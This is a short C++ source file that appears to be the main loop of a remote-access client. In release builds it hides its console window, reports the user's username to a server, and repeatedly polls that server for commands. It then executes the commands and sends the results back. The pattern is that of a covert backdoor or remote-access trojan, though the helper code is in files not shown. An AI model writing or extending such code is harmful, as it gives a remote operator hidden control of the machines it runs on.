#include "Propeties.h"

#ifndef MASTER

#include "Client.h"
#include "Rest.h"

#include <iostream>

int main() {

#if not defined(_DEBUG) && not defined(DEBUGGING)
	FreeConsole();
#endif

	const ProcessMap map = Client::Create();

	// send pulse to server
	const std::string username = Client::GetUsername();
	
	// fetch initial 
	MonitorCallback monitor = Client::GetMonitor(username);
	PulseCallback pulse = Client::GetPulse(username, Client::ResponseHandler);
	PollCallback poll = Client::GetPoll(username);

	pulse();

	while (true) {
		if (monitor() == "DEAD") {
			const std::string cmd = poll();
			const std::string response = Client::ProcessCommand(cmd, map);
			Client::Respond(username, response, Client::ResponseHandler);
			pulse();
#if defined(_DEBUG) || defined(DEBUGGING)
			std::cout << ">>> " << cmd << "\n<<< " << response << "\n\n";
#endif
		}
		
		Sleep(REFRESH_DELAY);
	}

	Client::Destroy();

	return 0;
}

#endif
